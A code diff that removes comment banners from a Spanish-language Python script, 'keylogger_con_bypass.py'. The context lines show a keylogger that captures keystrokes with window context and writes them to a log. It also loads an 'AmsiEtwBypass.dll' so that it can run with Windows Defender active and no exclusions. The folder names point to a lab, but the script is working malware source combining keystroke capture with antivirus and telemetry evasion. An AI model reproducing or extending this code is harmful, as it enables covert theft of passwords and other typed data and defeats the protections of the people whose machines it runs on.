@@ -1,8 +1,3 @@
-# ============================================================
-# keylogger_con_bypass.py
-# Keylogger con contexto + bypass AMSI/ETW
-# Ejecuta con Defender activo, sin exclusiones
-# ============================================================
 
 import ctypes
 import os
@@ -20,16 +15,12 @@ except ImportError as e:
     print("[*] Ejecuta: pip install pynput pywin32 psutil")
     sys.exit(1)
 
-# ============================================================
-# CONFIGURACIÓN
-# ============================================================
+
 LAB_DIR = r"C:\LabKeylogger"
 LOG_FILE = os.path.join(LAB_DIR, "04_logs", "captura_con_bypass.txt")
 DLL_PATH = os.path.join(LAB_DIR, "03_compilado", "AmsiEtwBypass.dll")
 
-# ============================================================
-# CARGAR DLL DE BYPASS
-# ============================================================
+
 def load_bypass():
     if not os.path.exists(DLL_PATH):
         print(f"[!] DLL no encontrada: {DLL_PATH}")
@@ -50,9 +41,7 @@ def load_bypass():
         print(f"[!] Error al cargar DLL: {e}")
         return None
 
-# ============================================================
-# KEYLOGGER
-# ============================================================
+
 ventana_actual = ""
 lock = threading.Lock()
 
@@ -97,9 +86,7 @@ def on_release(key):
         print("\n[!] Keylogger detenido con ESC")
         return False
 
-# ============================================================
-# MAIN
-# ============================================================
+
 if __name__ == "__main__":
     print("=" * 60)
     print("  KEYLOGGER CON BYPASS - DEFENDER ACTIVO")
